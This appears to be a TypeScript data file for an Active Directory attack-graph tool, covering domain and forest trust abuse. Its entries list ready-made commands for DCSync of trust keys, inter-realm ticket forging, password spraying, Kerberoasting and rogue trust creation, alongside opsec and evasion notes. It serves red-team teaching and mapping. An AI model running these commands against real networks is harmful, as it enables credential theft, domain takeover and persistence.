import type { AttackEdge, TechniqueNodeDef } from '../schema';

const r = String.raw;
const mitre = (id: string): { id: string; url: string } => ({
  id,
  url: `https://attack.mitre.org/techniques/${id.replace('.', '/')}/`,
});

/** Domain & forest trust abuse (web-verified). Grouped under the ad-cat-trusts category. */
export const adTrustNodes: TechniqueNodeDef[] = [
  {
    id: 'trust-enum',
    label: 'Trust Enumeration',
    phase: 'enumeration',
    summary: 'Map every trust: direction, transitivity, SID filtering.',
    description: r`Before any trust attack, map the topology: which domains trust which, the direction, transitivity, and the trustAttributes flags (WITHIN_FOREST 0x20, FOREST_TRANSITIVE 0x8, QUARANTINED_DOMAIN 0x4, TREAT_AS_EXTERNAL 0x40). PowerView's Get-DomainTrustMapping crawls reachable trusts, nltest queries them natively, and BloodHound renders the graph. The trustAttributes value tells you whether SID filtering is in play and therefore which abuse paths are viable.`,
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'PowerView', url: 'https://github.com/PowerShellMafia/PowerSploit' },
      { name: 'BloodHound CE', url: 'https://github.com/SpecterOps/BloodHound' },
      { name: 'nltest', url: 'https://ss64.com/nt/nltest.html' },
    ],
    commands: [
      { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 get trusts --transitive', lang: 'bash' },
      { label: 'Map all trusts (PowerView)', code: r`Get-DomainTrustMapping | Export-CSV -NoTypeInformation trusts.csv`, lang: 'powershell' },
      { label: 'Enumerate trusts natively', code: r`nltest /domain_trusts /all_trusts /v`, lang: 'cmd' },
    ],
    mitre: mitre('T1482'),
    references: [{ label: 'The Hacker Recipes, Domain trusts', url: 'https://www.thehacker.recipes/ad/movement/trusts/' }],
    requires: ['Any valid domain account'],
    opsec: 'nltest /domain_trusts is a well-known discovery indicator (T1482); BloodHound collection is noisy. LDAP reads of trustedDomain objects blend with normal directory traffic.',
    difficulty: 'easy',
  },
  {
    id: 'trust-ticket',
    label: 'Inter-Realm Trust Ticket',
    phase: 'domain-dominance',
    summary: 'Forge a referral TGT with the trust key to reach a trusted domain.',
    description: r`Each trust has a shared inter-realm key, stored in a TRUSTEDDOMAIN$ trust account in the trusting domain and rotated ~every 30 days. DCSync that trust account to recover its hash, then forge an inter-realm referral TGT with ticketer.py using -spn krbtgt/<target_domain>, which is distinct from a golden ticket that uses the local krbtgt key. Present the referral ticket to the target KDC (getST.py) to authenticate across the trust. SID filtering still constrains which ExtraSids the target honors.`,
    tools: [
      { name: 'ticketer (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'getST (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'secretsdump (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'DCSync the trust account hash', code: r`secretsdump.py -just-dc-user 'TRUSTEDDOMAIN$' domain.local/admin:pass@dc01`, lang: 'bash' },
      { label: 'Forge an inter-realm referral TGT', code: r`ticketer.py -nthash <TRUST_KEY_HASH> -domain-sid <SOURCE_SID> -domain source.local -extra-sid <TARGET_SID>-<RID> -spn krbtgt/target.local user`, lang: 'bash' },
      { label: 'Request a service ticket in the target domain', code: r`KRB5CCNAME=user.ccache getST.py -k -no-pass -spn CIFS/dc.target.local target.local/user@target.local`, lang: 'bash' },
    ],
    references: [
      { label: 'HackTricks, SID-History Injection', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/sid-history-injection.html' },
      { label: 'harmj0y, A Guide to Attacking Domain Trusts', url: 'https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/' },{ label: 'The Hacker Recipes, Domain trusts', url: 'https://www.thehacker.recipes/ad/movement/trusts/' }],
    requires: ['The inter-realm trust key (DCSync of the TRUSTEDDOMAIN$ account)', 'Source and target domain SIDs'],
    opsec: 'A forged inter-realm TGT shows golden-ticket-style anomalies (no preceding AS-REQ, odd lifetime/etype). Prefer AES over RC4. SID filtering / quarantine limits which ExtraSids are accepted.',
    difficulty: 'hard',
  },
  {
    id: 'trust-external-abuse',
    label: 'External Trust Abuse',
    phase: 'lateral-movement',
    summary: 'Non-transitive external trust: password reuse, RID≥1000 ExtraSids.',
    description: r`External trusts are typically one-way and non-transitive with SID filtering enabled: SIDs with RID < 1000 (built-in/privileged groups) are quarantined and stripped. Remaining paths: reuse of credentials/hashes overlapping both domains, plain lateral movement using any foreign principal that holds rights in the trusting domain, and (where filtering is only partial) injecting ExtraSids of custom groups with RID ≥ 1000 that happen to be privileged. Confirm trustAttributes from trust-enum first.`,
    tools: [
      { name: 'PowerView', url: 'https://github.com/PowerShellMafia/PowerSploit' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Inspect trust direction & attributes', code: r`Get-DomainTrust -Domain external.local`, lang: 'powershell' },
      { label: 'Spray a reused credential into the trusting domain', code: r`nxc smb 10.0.0.1 -u users.txt -p 'Reused@Pass1' -d external.local --continue-on-success`, lang: 'bash' },
    ],
    references: [
      { label: 'HackTricks, External Forest Domain (One-Way Inbound)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/external-forest-domain-oneway-inbound.html' },{ label: 'The Hacker Recipes, Domain trusts', url: 'https://www.thehacker.recipes/ad/movement/trusts/' }],
    requires: ['A mapped external trust', 'Foreign rights or reused credentials into the trusting domain'],
    opsec: 'SID filtering on external trusts strips RID<1000 SIDs, so Enterprise/Domain Admins ExtraSid injection fails. Whether partial filtering (TREAT_AS_EXTERNAL) leaves any RID≥1000 path is environment-specific. Verify the actual trustAttributes before relying on it.',
    difficulty: 'medium',
  },
  {
    id: 'trust-forest-abuse',
    label: 'Inter-Forest Trust Abuse',
    phase: 'lateral-movement',
    summary: 'Forest-transitive trust: cross-forest Kerberoast & foreign ACLs.',
    description: r`Forest trusts are FOREST_TRANSITIVE (trustAttributes 0x8) and span every domain in both forests, but SID filtering is enabled by default, so cross-forest SID-history hopping is blocked. The realistic surface is access-based: Kerberoast service accounts in the foreign forest, and abuse foreign principals that hold ACLs or local-group membership in your forest (and vice-versa). Enumerate those foreign access relationships before acting.`,
    tools: [
      { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
      { name: 'PowerView', url: 'https://github.com/PowerShellMafia/PowerSploit' },
    ],
    commands: [
      { label: 'Cross-forest Kerberoast (Rubeus)', code: r`Rubeus.exe kerberoast /domain:foreign.local /nowrap`, lang: 'powershell' },
      { label: 'Find SPN accounts in the foreign forest', code: r`Get-DomainUser -SPN -Domain foreign.local | Get-DomainSPNTicket`, lang: 'powershell' },
    ],
    references: [
      { label: 'HackTricks, External Forest Domain (One-Way Outbound)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/external-forest-domain-one-way-outbound.html' },{ label: 'harmj0y, Attacking Domain Trusts', url: 'https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/' }],
    requires: ['A mapped forest (FOREST_TRANSITIVE) trust', 'A valid account in the trusting forest'],
    opsec: 'Cross-forest TGS requests (4769) for foreign SPNs and BloodHound cross-forest collection are visible. Injecting the foreign Enterprise/Domain Admins SID is filtered, so do not expect SID-history escalation across a forest boundary. Historical SID-filter bypasses (e.g. CVE-2020-0665) are patched on current builds.',
    difficulty: 'hard',
  },
  {
    id: 'foreign-membership',
    label: 'Foreign Group Membership',
    phase: 'enumeration',
    summary: 'Find principals from domain A with rights in domain B.',
    description: r`Trusts let a principal from one domain be a member of a group (typically a domain-local group) in another. Get-DomainForeignGroupMember enumerates a target domain's groups that contain outside members (its incoming access); Get-DomainForeignUser finds users belonging to groups outside their own domain (outgoing access). These foreign memberships are the concrete cross-trust access paths feeding external/forest-trust abuse; Get-DomainForeignUser reliably reflects only universal groups due to global-catalog replication.`,
    tools: [
      { name: 'PowerView', url: 'https://github.com/PowerShellMafia/PowerSploit' },
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
    ],
    commands: [
      { label: 'Groups with foreign members (incoming)', code: r`Get-DomainForeignGroupMember -Domain target.domain.local`, lang: 'powershell' },
      { label: 'Users in groups outside their domain (outgoing)', code: r`Get-DomainForeignUser`, lang: 'powershell' },
      { label: 'List ForeignSecurityPrincipals (bloodyAD)', code: r`bloodyAD -u user -p pass -d domain.local --host dc01 get search --base 'CN=ForeignSecurityPrincipals,DC=domain,DC=local' --filter '(objectClass=foreignSecurityPrincipal)' --attr cn,memberOf`, lang: 'bash' },
    ],
    mitre: mitre('T1482'),
    references: [{ label: 'PowerSploit, Get-DomainForeignGroupMember', url: 'https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainForeignGroupMember/' }],
    requires: ['Any valid domain account', 'At least one mapped trust'],
    opsec: 'LDAP group-membership enumeration blends with normal directory traffic; large global-catalog queries across many domains are the main signal. Read-only.',
    difficulty: 'easy',
  },
  {
    id: 'trust-modification',
    label: 'Domain Trust Modification',
    phase: 'persistence',
    summary: 'Create or alter a trust / federation for durable cross-domain access.',
    description: r`With Domain Admin (or write over trust objects) an attacker can add a new domain trust, flip trustAttributes (disable SID filtering / quarantine, or set TREAT_AS_EXTERNAL), or extend AD FS federation with an attacker-controlled token-signing certificate. Loosening SID filtering re-opens the SID-history / ExtraSids hopping that filtering would otherwise block, and a rogue trust/federation is durable, low-profile persistence. Distinct from forging SID history (T1134.005): this tampers with the trust relationship itself.`,
    tools: [
      { name: 'PowerView', url: 'https://github.com/PowerShellMafia/PowerSploit' },
      { name: 'AD PowerShell / netdom', url: 'https://learn.microsoft.com/en-us/powershell/module/activedirectory/' },
    ],
    commands: [
      { label: 'Inspect trustAttributes before tampering', code: r`Get-DomainTrust -Domain target.local`, lang: 'powershell' },
      { label: 'Create a one-way inbound trust (netdom)', code: r`netdom trust target.local /Domain:attacker.local /add /oneside:trusted /passwordt:Trust_Pass1`, lang: 'cmd' },
    ],
    mitre: mitre('T1484.002'),
    references: [
      { label: 'MITRE ATT&CK T1484.002, Trust Modification', url: 'https://attack.mitre.org/techniques/T1484/002/' },
      { label: 'The Hacker Recipes, Domain trusts', url: 'https://www.thehacker.recipes/ad/movement/trusts/' },
    ],
    requires: ['Domain Admin / write over the trustedDomain object (or AD FS admin)', 'A target domain/forest (existing or attacker-created)'],
    opsec: 'Trust creation/modification is a high-signal directory change (Event 4706/4716/4717/4718, and 5136 on trustedDomain objects). Disabling SID filtering or adding a federation cert is a strong, durable indicator. Defenders auditing trust topology will spot a new or loosened trust.',
    difficulty: 'hard',
  },
  {
    id: 'enterprise-admin',
    label: 'Enterprise Admin (Forest Root)',
    phase: 'domain-dominance',
    kind: 'goal',
    summary: '👑 Forest-root compromise: every domain in the forest.',
    description: r`The forest, not the domain, is Active Directory's true security boundary, and Enterprise Admins (a group in the forest-root domain) administer every domain inside it. Reaching this node means you've escalated *beyond* a single Domain Admin by crossing an intra-forest trust to the root: a golden/inter-realm ticket whose ExtraSids carries the root Enterprise Admins SID (<root-SID>-519), a child→parent SID-history hop, or a forged inter-realm referral ticket. From forest root you control every domain's krbtgt, every DC, and can establish persistence at forest scope. This is a distinct, higher goal than the per-domain Domain Admin node: cross-forest trusts can yield several Domain Admins and, at the top, a single Enterprise Admin.`,
    requires: ['A cross-trust escalation: inter-realm trust ticket, parent-child krbtgt, or SID-history injection into the forest root'],
    mitre: mitre('T1134.005'),
    references: [
      { label: 'harmj0y, A Guide to Attacking Domain Trusts', url: 'https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/' },
      { label: 'The Hacker Recipes, Domain trusts', url: 'https://www.thehacker.recipes/ad/movement/trusts/' },
    ],
    difficulty: 'hard',
  },
];

export const adTrustEdges: AttackEdge[] = [
  { source: 'ad-cat-trusts', target: 'trust-enum' },
  { source: 'ad-cat-trusts', target: 'trust-sid-history' },
  { source: 'trust-enum', target: 'trust-ticket' },
  { source: 'trust-enum', target: 'trust-sid-history' },
  { source: 'trust-enum', target: 'trust-external-abuse' },
  { source: 'trust-enum', target: 'trust-forest-abuse' },
  { source: 'trust-enum', target: 'foreign-membership' },
  { source: 'dcsync', target: 'trust-ticket', label: 'trust account key' },
  // An inter-realm trust ticket grants DA in the TRUSTED domain (not necessarily the
  // forest root; that intra-forest child→root path is trust-sid-history).
  { source: 'trust-ticket', target: 'domain-admin', label: 'DA in trusted domain' },
  { source: 'foreign-membership', target: 'lateral-movement-cme', label: 'exercise foreign rights' },
  { source: 'trust-external-abuse', target: 'lateral-movement-cme', label: 'into trusting domain' },
  { source: 'trust-forest-abuse', target: 'lateral-movement-cme', label: 'into target forest' },
  { source: 'ad-cat-trusts', target: 'trust-modification' },
  { source: 'domain-admin', target: 'trust-modification', label: 'tamper trust / SID filtering' },
  // Disabling SID filtering on an external/forest trust re-opens inter-realm ticket forging.
  { source: 'trust-modification', target: 'trust-ticket', label: 'SID filtering disabled' },
  // Forest root is its own pinnacle goal; from there you persist at forest scope.
  { source: 'enterprise-admin', target: 'ad-cat-persistence', label: 'forest-wide persistence' },
];
